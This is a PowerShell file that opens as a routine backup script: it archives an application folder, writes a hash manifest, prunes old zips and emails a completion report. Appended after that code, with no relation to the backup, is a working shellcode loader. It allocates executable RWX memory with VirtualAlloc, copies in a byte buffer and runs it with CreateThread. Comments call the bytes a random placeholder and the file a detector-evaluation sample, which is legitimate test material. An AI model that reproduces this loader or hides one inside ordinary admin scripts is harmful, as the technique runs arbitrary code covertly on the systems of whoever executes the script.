[CmdletBinding()]
param(
    [string]$SourcePath = 'C:\Apps\Contoso.Portal',
    [Parameter(HelpMessage = 'Optional. The default value is used when the parameter is omitted.')]
    [string]$BackupRoot = 'D:\Backups\Portal',
    [Parameter(Mandatory = $false)]
    [ValidateRange(1, 365)]
    [int]$RetentionDays = 21,
    [ValidateSet('Optimal', 'Fastest', "NoCompression")]
    [string]$CompressionLevel = 'Fastest',

    [int]$MinFreeGB = 20,

    [switch]$DryRun
)

$ErrorActionPreference = 'Stop'

$hostName = $env:COMPUTERNAME

New-Item -Path $BackupRoot -ItemType Directory -Force | Out-Null

$stamp = Get-Date -Format 'yyyyMMdd-HHmmss'
$archive = Join-Path -Path $BackupRoot -ChildPath ("backup-" + $stamp + ".zip")
New-Item -Path $BackupRoot -ItemType Directory -Force | Out-Null
Compress-Archive -Path (Join-Path $SourcePath '*') -DestinationPath $archive -CompressionLevel $CompressionLevel -Force
$item = Get-Item -LiteralPath $archive
$hash = Get-FileHash -LiteralPath $archive -Algorithm SHA256
$manifest = [pscustomobject]@{
    Archive   = $archive
    SizeMB    = [math]::Round($item.Length / 1MB, 2)
    SHA256    = $hash.Hash
    CreatedAt = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
    Source    = $SourcePath
}

$manifest | ConvertTo-Json -Depth 5 | Set-Content -Path (Join-Path $BackupRoot 'last-backup.json') -Encoding UTF8

$cutoff = (Get-Date).AddDays(-$RetentionDays)
$expired = Get-ChildItem -Path $BackupRoot -Filter '*.zip' -File |
    Where-Object { $_.LastWriteTime -lt $cutoff }
foreach ($zip in $expired) {
    Write-Host ("Expired: {0}" -f $zip.Name)
    if ($DryRun) {
        Write-Host ("Would remove {0}" -f $zip.FullName)
        continue
    }
    Remove-Item -LiteralPath $zip.FullName -Force
}

$driveLetter = $BackupRoot.Substring(0, 1)
$drive = Get-PSDrive -Name $driveLetter -ErrorAction SilentlyContinue
if ($drive) {
    $freeGB = [math]::Round($drive.Free / 1GB, 1)
    if ($freeGB -lt $MinFreeGB) {
        Write-Warning ("Low free space on backup volume: {0} GB" -f $freeGB)
    }
}

Write-Host ("Backup complete: {0:N2} MB" -f $item.Length / 1MB) -ForegroundColor Green
$manifest | Format-List

$MailTo = 'backup-ops@internal.corp'
$MailFrom = 'backup@internal.corp'
$mailBody = ("Archive: {0} ({1} MB)" -f $archive, $manifest.SizeMB)

$mailParams = @{
    To         = $MailTo
    From       = $MailFrom
    Subject    = 'Backup completed'
    Body       = $mailBody
    SmtpServer = 'smtp.internal.corp'
    Port       = 25
    UseSsl     = $true
}
Send-MailMessage @mailParams
<#
.SYNOPSIS
    Loads a prepared binary buffer into committed memory and starts it
    on a worker thread.

.DESCRIPTION
    Allocates RWX memory with VirtualAlloc, copies the prepared buffer
    into it, starts a thread and waits for completion. The buffer is a
    placeholder supplied for static-analysis exercises.

.NOTES
    Sample generated for detector evaluation. No real payload is used.
#>

$LogPath = "$env:TEMP\run.log"

$NativeCode = @"
using System;
using System.Runtime.InteropServices;

public static class PlatformApi
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
        uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

Add-Type -TypeDefinition $NativeCode -Language CSharp

# buffer placeholder: random bytes, replaces the encrypted stage in real samples
$Buffer = [Byte[]] @(
    0x72, 0xd3, 0xe1, 0x71, 0x1b, 0x0a, 0xf8, 0x4b, 0x9f, 0x20, 0xe2, 0x72, 0xa0, 0xfb, 0xa2, 0x63,
    0x7b, 0x09, 0x58, 0x68, 0xe4, 0x49, 0x32, 0x12, 0x5b, 0xeb, 0x3c, 0x8c, 0x16, 0xad, 0xd9, 0xc6,
    0xb9, 0xc8, 0x67, 0x96, 0x35, 0x76, 0xc3, 0xf7, 0xa8, 0xdb, 0x1b, 0x48, 0x5f, 0xa8, 0xd9, 0xe7,
    0x71, 0xc0, 0xae, 0x1a, 0xd7, 0x77, 0x94, 0x41, 0xa9, 0xad, 0x15, 0x17, 0x61, 0x76, 0x8b, 0x08,
    0xfd, 0x3f, 0xe0, 0x27, 0x0c, 0x50, 0x02, 0x05, 0x07, 0x7a, 0xc3, 0x95, 0x27, 0xfc, 0x91, 0xec,
    0xfa, 0xc7, 0x75, 0xd4, 0xfe, 0x49, 0xb7, 0x00, 0x28, 0xe9, 0x65, 0xa0, 0x70, 0x84, 0x8b, 0xac,
    0x26, 0x31, 0xe1, 0x29, 0xa9, 0xa4, 0x53, 0xd5, 0x94, 0x26, 0x44, 0xa2, 0xa9, 0x31, 0x98, 0x29,
    0xfa, 0x2f, 0xfb, 0xd7, 0xf1, 0x97, 0x40, 0x2c, 0xcb, 0xdf, 0x6d, 0x24, 0x3e, 0x7c, 0xc0, 0x53,
    0x32, 0x0e, 0x58, 0xdc, 0x0a, 0xec, 0xcd, 0x70, 0x74, 0x46, 0xfb, 0x92, 0x19, 0xe2, 0x0f, 0xb5,
    0x57, 0xa0, 0xf4, 0x90, 0xd8, 0xb4, 0xb9, 0xec, 0x27, 0x44, 0x5f, 0x81, 0x04, 0x22, 0xe5, 0x74,
    0xae, 0x80, 0x23, 0x6f, 0x6f, 0x2b, 0x20, 0xb0, 0xf1, 0x0b, 0x5c, 0xc9, 0x9e, 0x81, 0x0c, 0x5a,
    0x42, 0x77, 0x83, 0x6d, 0x9c, 0x2e, 0xf6, 0x70, 0xe3, 0x34, 0xc7, 0xa9, 0x47, 0x31, 0xf6, 0xda,
    0x97, 0x4c, 0x4f, 0xbb, 0x4b, 0xbb, 0xdc, 0x2c, 0xe2, 0xe3, 0xe5, 0x20, 0xb9, 0xeb, 0x14, 0x9e,
    0x94, 0x74, 0xd6, 0x5b, 0x4f, 0x9a, 0xab, 0x71, 0x54, 0xe6, 0xf6, 0x0d, 0x4e, 0xa0, 0x74, 0x27,
    0x4a, 0xc1, 0x78, 0xdf, 0xfc, 0x0f, 0x1b, 0x98, 0x9b, 0x7e, 0xba, 0x67, 0x00, 0xf5, 0x2b, 0x26,
    0xf6, 0x0c, 0xaa, 0x03, 0x15, 0x56, 0x65, 0x33, 0x57, 0x61, 0x08, 0x21, 0x2f, 0xfe, 0x0a, 0x06,
    0x35, 0xe9, 0x82, 0x96, 0x66, 0x33, 0xdb, 0x24, 0xb6, 0x3a, 0x63, 0x7a, 0x5f, 0xe3, 0x3a, 0xf1,
    0x91, 0x1c, 0x9f, 0xd7, 0x2b, 0xa2, 0x4e, 0x23, 0x69, 0x65, 0xe6, 0xf6, 0x1f, 0xd7, 0x7f, 0xcb,
    0xad, 0x8e, 0xda, 0xc3, 0xc0, 0xe1, 0x2a, 0x1e, 0x7d, 0xdf, 0xc7, 0x1b, 0xba, 0x9f, 0x48, 0x21
)

$Handle = [PlatformApi]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
if ($Handle -eq [IntPtr]::Zero) {
    Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    return
}

[Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $Handle, $Buffer.Length)
$ThreadId = 0
$Thread = [PlatformApi]::CreateThread([IntPtr]::Zero, 0, $Handle, [IntPtr]::Zero, 0, [ref]$ThreadId)
[void][PlatformApi]::WaitForSingleObject($Thread, 682)
[void][PlatformApi]::CloseHandle($Thread)

$Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
$Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
